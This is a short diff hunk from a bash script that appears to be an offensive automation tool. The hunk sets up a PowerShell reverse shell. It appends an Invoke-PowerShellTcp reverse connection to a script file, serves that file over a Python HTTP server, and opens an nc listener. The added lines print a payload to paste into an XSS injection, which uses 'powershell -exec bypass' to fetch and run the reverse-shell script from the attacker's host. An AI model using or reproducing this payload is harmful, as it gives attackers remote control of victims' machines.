@@ -9205,6 +9205,8 @@ while true; do
 			then
 				echo -ne "\nInvoke-PowerShellTcp -Reverse -IPAddress ""$MIP"" -Port ""$MPRT" >> Invoke-PowerShellTcp.ps1
 				python3 -m http.server &
+				echo "Paste this payload for XSS"
+				echo "[COPY+PASTE] | powershell -exec bypass -f \\\\\\\\""$MIP""\\\\""Invoke-PowerShellTcp.ps1"
 				rlwrap nc -lvnp "$MPRT"
 			fi
 		fi
